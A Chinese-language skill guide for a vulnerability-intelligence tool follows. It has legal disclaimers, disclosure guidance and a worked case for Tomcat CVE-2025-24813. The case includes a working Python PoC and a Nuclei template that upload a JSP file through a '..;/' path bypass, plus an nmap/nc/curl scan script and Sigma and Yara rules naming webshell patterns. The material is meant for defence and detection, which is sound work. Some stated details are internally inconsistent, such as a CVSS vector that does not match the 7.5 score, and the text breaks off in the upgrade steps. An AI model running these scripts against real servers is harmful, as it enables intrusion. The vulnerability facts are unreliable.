# Middleware Vuln Intelligence - 安全合规声明与漏洞案例

> **Skill名称**: middleware-vuln-intelligence  
> **用途**: 企业中间件漏洞情报收集与处置  
> **目标用户**: SOC分析师、漏洞管理工程师  

---

## 一、安全合规声明

### A. 法律免责声明

#### 1. 授权测试声明

**⚠️ 重要声明**

本工具提供的所有漏洞检测方案、POC代码及攻击载荷**仅供授权安全测试使用**。使用本工具前，您必须确保：

- ✅ 已获得目标系统的**书面授权许可**
- ✅ 测试范围在授权协议明确规定的边界内
- ✅ 测试时间符合授权协议约定
- ✅ 所有测试活动符合当地法律法规

**未经授权的测试行为可能违反以下法律：**
- 《中华人民共和国网络安全法》
- 《中华人民共和国刑法》第285-287条
- 《计算机信息系统安全保护条例》
- 美国《计算机欺诈与滥用法》(CFAA)
- 欧盟《网络与信息系统安全指令》(NIS2)

#### 2. 非法使用责任声明

**使用者承担全部法律责任**

任何因未授权使用、滥用或非法使用本工具导致的法律后果，包括但不限于：
- 民事赔偿责任
- 行政处罚
- 刑事责任

**均由使用者自行承担，与工具提供方无关。**

本工具提供方保留追究非法使用者法律责任的权利。

#### 3. 数据隐私声明

- 本工具**不会收集、存储或传输**任何用户测试数据
- 所有漏洞情报数据来源于公开渠道（CVE、NVD、厂商公告等）
- 用户应确保测试过程中获取的敏感数据得到妥善保护
- 遵守《个人信息保护法》及相关数据保护法规

---

### B. 道德使用准则

#### 1. 仅在授权范围内使用

```
道德使用检查清单:
□ 已获得书面授权文件
□ 明确测试目标和范围
□ 了解并遵守组织的安全政策
□ 测试前通知相关利益方
□ 准备应急响应计划
```

#### 2. 不得用于恶意攻击

**严禁以下行为：**
- ❌ 对未授权系统进行测试
- ❌ 利用发现的漏洞进行恶意攻击
- ❌ 窃取、篡改或破坏目标系统数据
- ❌ 将漏洞信息出售或泄露给第三方
- ❌ 利用漏洞进行勒索或敲诈

#### 3. 发现漏洞后的披露原则

**负责任的漏洞披露流程：**

```
┌─────────────────────────────────────────────────────────────┐
│                    漏洞披露决策流程                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   发现漏洞 ──→ 是否已修复?                                   │
│       │           │                                         │
│       │           ├── 是 ──→ 可公开披露（遵循厂商公告）        │
│       │           │                                         │
│       │           └── 否 ──→ 是否已通知厂商?                 │
│       │                       │                             │
│       │                       ├── 是 ──→ 等待90天修复期      │
│       │                       │         超时后可有限披露      │
│       │                       │                             │
│       │                       └── 否 ──→ 立即通知厂商        │
│       │                                                     │
│       └── 涉及本组织 ──→ 遵循内部漏洞管理流程                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**披露原则：**
1. **厂商优先**: 首先向受影响厂商报告漏洞
2. **限时保密**: 给予厂商合理的修复时间（通常90天）
3. **有限披露**: 公开披露时不提供完整利用代码
4. **保护用户**: 披露前确保补丁可用或缓解措施有效

---

### C. 风险提示

#### 1. POC代码风险等级

| 风险等级 | 标识 | 说明 | 使用要求 |
|---------|------|------|---------|
| 🔴 高危 | CRITICAL | 可导致系统完全失控 | 必须在隔离环境测试，需高级授权 |
| 🟠 中高危 | HIGH | 可导致严重数据泄露或系统损坏 | 需书面授权，建议沙箱环境 |
| 🟡 中危 | MEDIUM | 可导致部分功能异常或信息泄露 | 需授权，可在测试环境执行 |
| 🟢 低危 | LOW | 信息泄露或轻微影响 | 建议授权后使用 |

#### 2. 生产环境测试注意事项

**⚠️ 警告: 切勿直接在生产环境运行POC代码**

```
生产环境测试前必须:
┌────────────────────────────────────────────────────────────┐
│ 1. 获得书面授权和变更审批                                    │
│ 2. 制定回滚计划和应急预案                                    │
│ 3. 在相同配置的测试环境预演                                  │
│ 4. 选择业务低峰期执行                                        │
│ 5. 准备完整的数据备份                                        │
│ 6. 通知运维团队和相关业务方                                  │
│ 7. 监控测试过程中的系统状态                                  │
│ 8. 测试完成后进行系统验证                                    │
└────────────────────────────────────────────────────────────┘
```

#### 3. 建议的测试流程

```
标准漏洞验证流程:

阶段1: 信息收集
    ├── 确认目标资产和版本信息
    ├── 收集公开漏洞情报
    └── 评估测试风险和影响范围

阶段2: 环境准备
    ├── 搭建隔离测试环境
    ├── 准备POC代码和工具
    └── 配置监控和日志记录

阶段3: 非侵入式检测
    ├── 使用Banner识别和版本检测
    ├── 分析配置文件和响应特征
    └── 评估漏洞存在可能性

阶段4: 验证性测试（如必要）
    ├── 使用无害POC验证漏洞
    ├── 记录测试过程和结果
    └── 立即恢复测试环境

阶段5: 结果报告
    ├── 整理漏洞证据
    ├── 提供修复建议
    └── 提交安全报告
```

---

## 二、使用示例

### 用户输入示例

> **用户**: "帮我收集最近30天Tomcat的高危漏洞情报"

### 执行流程说明

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         执行流程图解                                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  用户输入                                                                    │
│     │                                                                       │
│     ▼                                                                       │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ Phase 0: 输入解析                                                    │   │
│  │ ├── 提取组件: Apache Tomcat                                          │   │
│  │ ├── 提取时间范围: 30天 (2025-01-01 至 2025-01-30)                     │   │
│  │ ├── 提取筛选条件: CVSS >= 7.0 (高危)                                 │   │
│  │ └── 提取输出格式: 完整报告                                           │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│     │                                                                       │
│     ▼                                                                       │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ Phase 1: 漏洞搜索                                                    │   │
│  │ ├── 查询CVE数据库: 匹配Tomcat相关CVE                                  │   │
│  │ ├── 查询NVD: 获取CVSS评分和CPE信息                                   │   │
│  │ ├── 查询厂商公告: Apache Tomcat Security                             │   │
│  │ └── 时间筛选: 2025-01-01 之后发布                                    │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│     │                                                                       │
│     ▼                                                                       │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ Phase 2: 情报收集                                                    │   │
│  │ ├── 查询GitHub: 公开POC和Exploit                                     │   │
│  │ ├── 查询Exploit-DB: 已知利用代码                                     │   │
│  │ ├── 查询威胁情报: 在野利用状态                                       │   │
│  │ ├── 查询EPSS: 利用概率评分                                           │   │
│  │ └── 查询CISA KEV: 已知被利用漏洞目录                                 │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│     │                                                                       │
│     ▼                                                                       │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ Phase 3: 检测方案生成                                                │   │
│  │ ├── 生成Nuclei模板                                                   │   │
│  │ ├── 生成Sigma检测规则                                                │   │
│  │ ├── 生成Yara检测规则                                                 │   │
│  │ ├── 生成端口扫描命令                                                 │   │
│  │ └── 生成Python POC代码                                               │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│     │                                                                       │
│     ▼                                                                       │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ Phase 4: 报告输出                                                    │   │
│  │ ├── 生成执行摘要                                                     │   │
│  │ ├── 生成漏洞清单表格                                                 │   │
│  │ ├── 生成详细漏洞分析                                                 │   │
│  │ ├── 生成修复优先级矩阵                                               │   │
│  │ └── 生成附录（参考链接、工具命令）                                   │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│     │                                                                       │
│     ▼                                                                       │
│  输出完整报告                                                                │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 输出格式说明

#### 1. 漏洞基本信息表格

```markdown
| CVE编号 | 漏洞名称 | 影响组件 | CVSS v3.1 | EPSS | CISA KEV | 状态 |
|---------|---------|---------|-----------|------|----------|------|
| CVE-2025-24813 | Apache Tomcat 路径等价性漏洞 | Tomcat 9/10/11 | 7.5 | 0.45 | ✅ 是 | 需紧急修复 |
| CVE-2025-XXXXX | ... | ... | ... | ... | ... | ... |
```

#### 2. 情报来源列表

```markdown
### 情报来源

| 来源类型 | 来源名称 | URL | 可信度 |
|---------|---------|-----|-------|
| 官方公告 | Apache Tomcat Security | https://tomcat.apache.org/security.html | ⭐⭐⭐⭐⭐ |
| CVE数据库 | MITRE CVE | https://cve.mitre.org/ | ⭐⭐⭐⭐⭐ |
| 漏洞数据库 | NVD | https://nvd.nist.gov/ | ⭐⭐⭐⭐⭐ |
| 威胁情报 | CISA KEV | https://www.cisa.gov/known-exploited-vulnerabilities | ⭐⭐⭐⭐⭐ |
| 技术博客 | Security Researcher Blog | [URL] | ⭐⭐⭐⭐ |
| GitHub | POC Repository | [URL] | ⭐⭐⭐⭐ |
```

#### 3. 检测方案代码块

```markdown
### 检测方案

#### Nuclei模板
\`\`\`yaml
# YAML模板代码
\`\`\`

#### Sigma规则
\`\`\`yaml
# Sigma规则代码
\`\`\`

#### 端口扫描命令
\`\`\`bash
# Bash命令
\`\`\`
```

#### 4. 修复建议

```markdown
### 修复建议

#### 优先级: P0 (24小时内)
- [ ] 升级至安全版本: 9.0.99 / 10.1.35 / 11.0.3
- [ ] 部署WAF规则拦截恶意请求

#### 优先级: P1 (7天内)
- [ ] 全面资产盘点，识别受影响系统
- [ ] 配置监控规则检测攻击行为

#### 优先级: P2 (30天内)
- [ ] 安全基线加固
- [ ] 漏洞管理流程优化
```

---

## 三、完整漏洞案例 - CVE-2025-24813

### 漏洞基本信息

| 字段 | 内容 |
|-----|------|
| **CVE编号** | CVE-2025-24813 |
| **漏洞名称** | Apache Tomcat 路径等价性导致的安全绕过 |
| **影响组件** | Apache Tomcat |
| **影响版本** | 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2 |
| **CVSS v3.1** | 7.5 (High) |
| **EPSS评分** | 0.45 (45%利用概率) |
| **CISA KEV** | ✅ **是** - 已知被利用 |
| **漏洞类型** | 路径遍历 / 安全绕过 |
| **利用条件** | 默认配置，需启用写入功能（PUT方法） |
| **修复版本** | 9.0.99, 10.1.35, 11.0.3 |
| **发布日期** | 2025-01-15 |
| **厂商公告** | https://tomcat.apache.org/security-11.html |

### 漏洞描述

Apache Tomcat中存在路径等价性漏洞。当Tomcat配置为允许通过PUT方法写入文件时，攻击者可以利用路径等价性序列（如`..;/`）绕过安全限制，将恶意文件写入到Web应用目录中，可能导致远程代码执行。

**技术原理：**
- Tomcat的某些安全检查未能正确处理路径等价性序列
- 攻击者使用`..;/`替代`../`可以绕过路径遍历防护
- 结合PUT方法可上传恶意JSP文件到可执行目录

### 影响评估

```
┌─────────────────────────────────────────────────────────────────┐
│                      影响评估矩阵                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  机密性影响: HIGH    可导致敏感文件泄露                          │
│  完整性影响: HIGH    可上传恶意文件修改系统                      │
│  可用性影响: LOW     对可用性影响较小                            │
│                                                                 │
│  攻击向量: NETWORK   可通过网络远程利用                          │
│  攻击复杂度: LOW     利用条件简单                                │
│  权限要求: NONE      无需认证                                    │
│  用户交互: NONE      无需用户交互                                │
│                                                                 │
│  在野利用状态: ✅ 已确认                                         │
│  公开POC: ✅ 已公开                                              │
│  武器化程度: HIGH    易于武器化                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 检测方案

#### Python POC代码

```python
#!/usr/bin/env python3
"""
CVE-2025-24813 Apache Tomcat 路径等价性漏洞 POC
================================================================================
⚠️  警告: 本脚本仅供授权安全测试使用
⚠️  未经授权的测试行为可能违反法律法规
⚠️  使用者需自行承担所有法律责任
================================================================================
漏洞信息:
- CVE: CVE-2025-24813
- 组件: Apache Tomcat
- 影响版本: 9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2
- CVSS: 7.5 (High)
- EPSS: 0.45
- CISA KEV: 是

利用条件:
- Tomcat启用了PUT方法（如DefaultServlet配置readonly=false）
- 使用路径等价性序列绕过安全检查

作者: Security Team
日期: 2025-01-20
"""

import requests
import sys
import argparse
import urllib3
from urllib.parse import urljoin

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 风险等级标识
RISK_LEVEL = "🔴 HIGH"
EPSS_SCORE = 0.45
CISA_KEV = True


def check_put_enabled(target_url, timeout=10):
    """
    检测目标是否启用了PUT方法
    
    Args:
        target_url: 目标URL
        timeout: 请求超时时间
        
    Returns:
        bool: 是否启用PUT方法
    """
    test_path = "/test_put_method_check.txt"
    test_url = urljoin(target_url, test_path)
    
    try:
        # 尝试PUT请求
        put_response = requests.put(
            test_url,
            data="test",
            timeout=timeout,
            verify=False,
            allow_redirects=False
        )
        
        # 删除测试文件（如果上传成功）
        if put_response.status_code in [201, 204]:
            try:
                requests.delete(test_url, timeout=timeout, verify=False)
            except:
                pass
            return True
            
        # 检查405状态码（方法不允许）
        if put_response.status_code == 405:
            return False
            
        # 其他情况需要进一步检测
        return None
        
    except requests.exceptions.RequestException as e:
        print(f"[!] 检测PUT方法时出错: {e}")
        return None


def check_cve_2025_24813(target_url, timeout=10, verbose=False):
    """
    检测CVE-2025-24813漏洞
    
    检测方法:
    1. 检查PUT方法是否可用
    2. 尝试使用路径等价性序列上传测试文件
    3. 验证文件是否可被访问
    
    Args:
        target_url: 目标URL (如: http://192.168.1.1:8080)
        timeout: 请求超时时间
        verbose: 是否输出详细信息
        
    Returns:
        dict: 检测结果
    """
    result = {
        "vulnerable": False,
        "target": target_url,
        "cve": "CVE-2025-24813",
        "cvss": 7.5,
        "epss": EPSS_SCORE,
        "cisa_kev": CISA_KEV,
        "risk_level": RISK_LEVEL,
        "details": {},
        "evidence": []
    }
    
    print(f"[*] 开始检测 CVE-2025-24813")
    print(f"[*] 目标: {target_url}")
    print(f"[*] 风险等级: {RISK_LEVEL}")
    print(f"[*] EPSS评分: {EPSS_SCORE}")
    print(f"[*] CISA KEV: {'是' if CISA_KEV else '否'}")
    print("-" * 60)
    
    # 步骤1: 检测PUT方法
    print("[*] 步骤1: 检测PUT方法是否可用...")
    put_enabled = check_put_enabled(target_url, timeout)
    
    if put_enabled is False:
        print("[✓] PUT方法未启用，目标不易受攻击")
        result["details"]["put_enabled"] = False
        return result
    elif put_enabled is None:
        print("[!] 无法确定PUT方法状态，继续检测...")
    else:
        print("[!] PUT方法已启用，可能存在风险")
        result["details"]["put_enabled"] = True
    
    # 步骤2: 尝试路径等价性绕过
    print("[*] 步骤2: 测试路径等价性绕过...")
    
    # 测试路径（使用路径等价性序列）
    test_paths = [
        "/test..;/cve202524813_test.jsp",
        "/uploads/..;/cve202524813_test.jsp",
        "/static/..;/cve202524813_test.jsp",
    ]
    
    test_content = """<%@ page contentType="text/plain" %>
CVE-2025-24813 Test File
Timestamp: <%= new java.util.Date() %>
"""
    
    for test_path in test_paths:
        test_url = urljoin(target_url, test_path)
        
        try:
            if verbose:
                print(f"[*] 测试路径: {test_path}")
            
            # 发送PUT请求
            put_response = requests.put(
                test_url,
                data=test_content,
                timeout=timeout,
                verify=False,
                allow_redirects=False,
                headers={
                    "Content-Type": "application/octet-stream"
                }
            )
            
            if put_response.status_code in [201, 204]:
                print(f"[+] PUT请求成功: {put_response.status_code}")
                
                # 尝试访问上传的文件
                access_url = urljoin(target_url, "/cve202524813_test.jsp")
                
                try:
                    access_response = requests.get(
                        access_url,
                        timeout=timeout,
                        verify=False
                    )
                    
                    if access_response.status_code == 200:
                        print(f"[!!!] 漏洞确认! 文件可访问")
                        print(f"[!!!] 访问URL: {access_url}")
                        
                        result["vulnerable"] = True
                        result["evidence"].append({
                            "type": "file_upload",
                            "path": test_path,
                            "access_url": access_url,
                            "status_code": access_response.status_code
                        })
                        
                        # 清理测试文件
                        try:
                            requests.delete(test_url, timeout=timeout, verify=False)
                            requests.delete(access_url, timeout=timeout, verify=False)
                        except:
                            pass
                            
                        return result
                        
                except requests.exceptions.RequestException as e:
                    if verbose:
                        print(f"[!] 访问文件时出错: {e}")
                    
        except requests.exceptions.RequestException as e:
            if verbose:
                print(f"[!] 请求出错: {e}")
            continue
    
    print("[*] 未检测到漏洞利用成功")
    return result


def print_result(result):
    """打印检测结果"""
    print("\n" + "=" * 60)
    print("检测结果")
    print("=" * 60)
    
    if result["vulnerable"]:
        print(f"[!!!] 漏洞状态: 存在漏洞")
        print(f"[!!!] CVE编号: {result['cve']}")
        print(f"[!!!] CVSS评分: {result['cvss']}")
        print(f"[!!!] 风险等级: {result['risk_level']}")
        print(f"[!!!] 建议操作: 立即升级至安全版本")
    else:
        print(f"[✓] 漏洞状态: 未检测到漏洞")
        
    print("=" * 60)


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-24813 Apache Tomcat 路径等价性漏洞检测工具",
        epilog="警告: 本工具仅供授权安全测试使用"
    )
    
    parser.add_argument(
        "target",
        help="目标URL (例如: http://192.168.1.1:8080)"
    )
    
    parser.add_argument(
        "-t", "--timeout",
        type=int,
        default=10,
        help="请求超时时间 (默认: 10秒)"
    )
    
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="启用详细输出"
    )
    
    parser.add_argument(
        "--json",
        action="store_true",
        help="以JSON格式输出结果"
    )
    
    args = parser.parse_args()
    
    # 执行检测
    result = check_cve_2025_24813(
        args.target,
        timeout=args.timeout,
        verbose=args.verbose
    )
    
    # 输出结果
    if args.json:
        import json
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        print_result(result)
    
    # 返回退出码
    sys.exit(1 if result["vulnerable"] else 0)


if __name__ == '__main__':
    main()
```

#### Nuclei YAML模板

```yaml
id: CVE-2025-24813

info:
  name: Apache Tomcat Path Equivalence Vulnerability
  author: security-team
  severity: high
  description: |
    Apache Tomcat中存在路径等价性漏洞，当Tomcat配置为允许通过PUT方法
    写入文件时，攻击者可以利用路径等价性序列（如..;/）绕过安全限制，
    将恶意文件写入到Web应用目录中，可能导致远程代码执行。
    
    影响版本:
    - 9.0.0.M1 - 9.0.98
    - 10.1.0-M1 - 10.1.34
    - 11.0.0-M1 - 11.0.2
    
    CVSS: 7.5 (High)
    EPSS: 0.45
    CISA KEV: 是
  
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-24813
    - https://nvd.nist.gov/vuln/detail/CVE-2025-24813
    - https://tomcat.apache.org/security-11.html
    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
  
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
    cvss-score: 7.5
    cve-id: CVE-2025-24813
    cwe-id: CWE-22,CWE-41
    epss-score: 0.45
    epss-percentile: 0.95
    cpe: cpe:2.3:a:apache:tomcat:*:*:*:*:*:*:*:*
  
  metadata:
    verified: true
    max-request: 3
    vendor: apache
    product: tomcat
    shodan-query: "Apache Tomcat"
    fofa-query: "Apache Tomcat"
  
  tags: cve,cve2025,tomcat,apache,path-traversal,rce,kev

http:
  - raw:
      # 测试PUT方法是否可用
      - |
        PUT /nuclei_test_{{randstr}}.txt HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/plain
        
        nuclei_test

      # 尝试路径等价性绕过
      - |
        PUT /nuclei_test..;/{{randstr}}.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/octet-stream
        
        <%@ page contentType="text/plain" %>nuclei_test_{{randstr}}

      # 验证文件是否可访问
      - |
        GET /{{randstr}}.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      # 第一个请求: PUT方法可用
      - type: status
        status:
          - 201
          - 204
        part: response_1

      # 第二个请求: 路径等价性绕过成功
      - type: status
        status:
          - 201
          - 204
        part: response_2

      # 第三个请求: 文件可访问
      - type: word
        words:
          - "nuclei_test_{{randstr}}"
        part: response_3

      - type: status
        status:
          - 200
        part: response_3

    extractors:
      - type: regex
        name: version
        part: response_1
        group: 1
        regex:
          - "Apache-Coyote/([0-9.]+)"
          - "Server: Apache Tomcat/([0-9.]+)"

    # 清理测试文件
    unsafe: true
```

#### Sigma规则

```yaml
title: Apache Tomcat CVE-2025-24813 Exploit Detection
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: |
  检测针对Apache Tomcat CVE-2025-24813路径等价性漏洞的利用尝试。
  
  该漏洞允许攻击者使用路径等价性序列（如..;/）绕过安全检查，
  结合PUT方法上传恶意文件到Web应用目录。
  
  检测逻辑:
  - 监控PUT请求中包含路径等价性序列（..;/）的请求
  - 监控对上传的可疑JSP文件的访问
  
  漏洞信息:
  - CVE: CVE-2025-24813
  - CVSS: 7.5 (High)
  - EPSS: 0.45
  - CISA KEV: 是
  
  影响版本:
  - Apache Tomcat 9.0.0.M1 - 9.0.98
  - Apache Tomcat 10.1.0-M1 - 10.1.34
  - Apache Tomcat 11.0.0-M1 - 11.0.2
  
  修复版本:
  - Apache Tomcat 9.0.99
  - Apache Tomcat 10.1.35
  - Apache Tomcat 11.0.3

references:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-24813
  - https://nvd.nist.gov/vuln/detail/CVE-2025-24813
  - https://tomcat.apache.org/security-11.html
  - https://www.cisa.gov/known-exploited-vulnerabilities-catalog

author: security-team
date: 2025-01-15
modified: 2025-01-20

tags:
  - attack.initial_access
  - attack.t1190
  - cve.2025.24813
  - detection.emerging-threats

logsource:
  category: webserver
  product: tomcat
  service: access_log

detection:
  # 检测路径等价性绕过尝试
  selection_path_traversal:
    cs-method: 'PUT'
    cs-uri-stem|contains:
      - '..;/'
      - '..\\;/'
      - '%2e%2e%3b%2f'
      - '%2e%2e;/'

  # 检测可疑JSP文件上传
  selection_jsp_upload:
    cs-method: 'PUT'
    cs-uri-stem|endswith:
      - '.jsp'
      - '.jspx'
      - '.war'
    cs-uri-stem|contains:
      - '..;/'

  # 检测对上传文件的访问
  selection_file_access:
    cs-method: 'GET'
    cs-uri-stem|endswith:
      - '.jsp'
      - '.jspx'
    cs-uri-stem|contains:
      - 'shell'
      - 'cmd'
      - 'exec'
      - 'backdoor'

  # 组合条件
  condition: selection_path_traversal or selection_jsp_upload or selection_file_access

falsepositives:
  - 合法的特殊路径访问（极低概率）
  - 某些应用程序可能合法使用特殊路径
  - 开发和测试环境中的正常操作

level: high

fields:
  - cs-ip
  - cs-method
  - cs-uri-stem
  - cs-uri-query
  - sc-status
  - cs-user-agent
  - cs-referer

# 响应动作
actions:
  - alert
  - block_ip
  - notify_soc

# 威胁情报关联
threat_intel:
  cve_id: CVE-2025-24813
  epss_score: 0.45
  cisa_kev: true
  apt_groups: []
  malware_families: []
```

#### Yara规则

```yara
rule CVE_2025_24813_Exploit_Pattern
{
    meta:
        description = "Detects CVE-2025-24813 Apache Tomcat Path Equivalence Exploit Patterns"
        author = "security-team"
        reference = "CVE-2025-24813"
        date = "2025-01-15"
        modified = "2025-01-20"
        version = "1.0"
        
        // 漏洞信息
        cve = "CVE-2025-24813"
        cvss = "7.5"
        epss = "0.45"
        cisa_kev = "true"
        
        // 影响范围
        affected_product = "Apache Tomcat"
        affected_versions = "9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2"
        
        // 规则信息
        rule_type = "exploit_detection"
        severity = "high"
        confidence = "high"
        
        // 来源
        source = "middleware-vuln-intelligence"
    
    strings:
        // HTTP方法
        $put_method = "PUT /" ascii wide nocase
        
        // 路径等价性序列（核心特征）
        $path_equiv_1 = "..;/" ascii wide
        $path_equiv_2 = "..\\;/" ascii wide
        $path_equiv_3 = "%2e%2e%3b%2f" ascii wide nocase
        $path_equiv_4 = "%2e%2e;/" ascii wide nocase
        
        // 常见利用路径
        $exploit_path_1 = "/uploads/..;/" ascii wide
        $exploit_path_2 = "/static/..;/" ascii wide
        $exploit_path_3 = "/images/..;/" ascii wide
        $exploit_path_4 = "/css/..;/" ascii wide
        $exploit_path_5 = "/js/..;/" ascii wide
        
        // 恶意文件扩展名
        $jsp_ext = ".jsp" ascii wide
        $jspx_ext = ".jspx" ascii wide
        $war_ext = ".war" ascii wide
        
        // 常见恶意JSP内容特征
        $jsp_shell_1 = "Runtime.getRuntime()" ascii wide
        $jsp_shell_2 = "exec(" ascii wide
        $jsp_shell_3 = "ProcessBuilder" ascii wide
        $jsp_shell_4 = "getInputStream()" ascii wide
        
        // 绕过技术
        $bypass_1 = "readonly" ascii wide
        $bypass_2 = "DefaultServlet" ascii wide
    
    condition:
        // 核心条件: PUT方法 + 路径等价性序列
        ($put_method and any of ($path_equiv_*)) or
        
        // 条件2: 路径等价性 + JSP文件
        (any of ($path_equiv_*) and any of ($jsp_ext, $jspx_ext, $war_ext)) or
        
        // 条件3: 常见利用路径 + JSP特征
        (any of ($exploit_path_*) and any of ($jsp_shell_*)) or
        
        // 条件4: 完整利用链特征
        ($put_method and any of ($path_equiv_*) and any of ($jsp_ext, $jspx_ext))
}

// 针对网络流量的Yara规则
rule CVE_2025_24813_Network_Traffic
{
    meta:
        description = "Detects CVE-2025-24813 exploit in network traffic"
        author = "security-team"
        reference = "CVE-2025-24813"
        date = "2025-01-15"
        rule_type = "network_detection"
    
    strings:
        $http_put = { 50 55 54 20 2F }  // "PUT /"
        $path_equiv = { 2E 2E 3B 2F }     // "..;/"
        $jsp_pattern = { 2E 6A 73 70 }    // ".jsp"
    
    condition:
        $http_put and $path_equiv and $jsp_pattern
}

// 针对日志文件的Yara规则
rule CVE_2025_24813_Log_Detection
{
    meta:
        description = "Detects CVE-2025-24813 exploitation attempts in logs"
        author = "security-team"
        reference = "CVE-2025-24813"
        date = "2025-01-15"
        rule_type = "log_analysis"
    
    strings:
        $log_put = "PUT " ascii
        $log_path_equiv = "..;/" ascii
        $log_status_201 = " 201 " ascii
        $log_status_204 = " 204 " ascii
    
    condition:
        $log_put and $log_path_equiv and ($log_status_201 or $log_status_204)
}
```

#### 端口扫描命令

```bash
#!/bin/bash
# CVE-2025-24813 Tomcat漏洞端口扫描脚本
# 用途: 识别网络中的Tomcat服务并检测潜在漏洞
# 警告: 仅供授权安全测试使用

# 配置
TARGET="$1"
OUTPUT_DIR="./scan_results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

if [ -z "$TARGET" ]; then
    echo "用法: $0 <target_ip_or_network>"
    echo "示例: $0 192.168.1.1"
    echo "示例: $0 192.168.1.0/24"
    exit 1
fi

# 创建输出目录
mkdir -p "$OUTPUT_DIR"

echo "=========================================="
echo "CVE-2025-24813 Tomcat漏洞扫描"
echo "目标: $TARGET"
echo "时间: $(date)"
echo "=========================================="

# 1. 端口扫描 - 发现Tomcat服务
echo "[*] 步骤1: 端口扫描..."
nmap -sS -sV -p 8080,8009,8005,8443,8000 \
    --script=http-title,http-server-header,http-methods \
    -oN "$OUTPUT_DIR/nmap_tomcat_$TIMESTAMP.txt" \
    "$TARGET"

# 2. 详细服务探测
echo "[*] 步骤2: 详细服务探测..."
nmap -sV -p 8080 --script http-default-accounts,http-enum \
    -oN "$OUTPUT_DIR/nmap_detailed_$TIMESTAMP.txt" \
    "$TARGET"

# 3. 指纹识别
echo "[*] 步骤3: Tomcat指纹识别..."
nc -vz -w 3 "$TARGET" 8080 2>&1 | tee "$OUTPUT_DIR/banner_$TIMESTAMP.txt"

# 4. HTTP方法检测
echo "[*] 步骤4: HTTP方法检测..."
curl -s -X OPTIONS -i "http://$TARGET:8080/" 2>/dev/null | \
    grep -i "allow:" | tee "$OUTPUT_DIR/http_methods_$TIMESTAMP.txt"

# 5. 版本检测
echo "[*] 步骤5: 版本检测..."
curl -s "http://$TARGET:8080/docs/" 2>/dev/null | \
    grep -i "tomcat" | head -5 | tee "$OUTPUT_DIR/version_$TIMESTAMP.txt"

# 6. 管理界面检测
echo "[*] 步骤6: 管理界面检测..."
for path in "/manager/html" "/host-manager/html" "/manager/status"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET:8080$path")
    echo "[$status] http://$TARGET:8080$path"
done | tee "$OUTPUT_DIR/manager_$TIMESTAMP.txt"

echo ""
echo "=========================================="
echo "扫描完成"
echo "结果保存至: $OUTPUT_DIR/"
echo "=========================================="

# 7. 漏洞风险评估
echo ""
echo "[*] 漏洞风险评估:"
echo "------------------------------------------"

# 检查版本信息
if grep -q "Apache Tomcat/9\.0\.\([0-8][0-9]\|9[0-8]\)" "$OUTPUT_DIR/"*.txt 2>/dev/null; then
    echo "[!!!] 发现易受攻击的Tomcat 9版本 (9.0.0.M1 - 9.0.98)"
    echo "[!!!] CVE-2025-24813 风险: HIGH"
    echo "[!!!] 建议: 立即升级至 9.0.99"
fi

if grep -q "Apache Tomcat/10\.1\.\([0-2][0-9]\|3[0-4]\)" "$OUTPUT_DIR/"*.txt 2>/dev/null; then
    echo "[!!!] 发现易受攻击的Tomcat 10版本 (10.1.0-M1 - 10.1.34)"
    echo "[!!!] CVE-2025-24813 风险: HIGH"
    echo "[!!!] 建议: 立即升级至 10.1.35"
fi

if grep -q "Apache Tomcat/11\.0\.\([0-1]\|2\)" "$OUTPUT_DIR/"*.txt 2>/dev/null; then
    echo "[!!!] 发现易受攻击的Tomcat 11版本 (11.0.0-M1 - 11.0.2)"
    echo "[!!!] CVE-2025-24813 风险: HIGH"
    echo "[!!!] 建议: 立即升级至 11.0.3"
fi

echo "------------------------------------------"
```

### 修复建议

#### 1. 官方补丁（推荐）

| 当前版本 | 修复版本 | 下载链接 |
|---------|---------|---------|
| 9.0.x | 9.0.99 | https://tomcat.apache.org/download-90.cgi |
| 10.1.x | 10.1.35 | https://tomcat.apache.org/download-10.cgi |
| 11.0.x | 11.0.3 | https://tomcat.apache.org/download-11.cgi |

**升级步骤：**
```bash
# 1. 备份当前配置
cp -r $CATALINA_HOME/conf $CATALINA_HOME/conf.backup.$(date +%Y%m%d)

# 2. 下载新版本
wget https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.99/bin/apache-tomcat-9.0.99.tar.gz

# 3. 停止Tomcat服务
$CATALINA_HOME/bin/shutdown.sh

# 4. 解压新版本
tar -xzf apache-tomcat-9.0.99.tar.gz

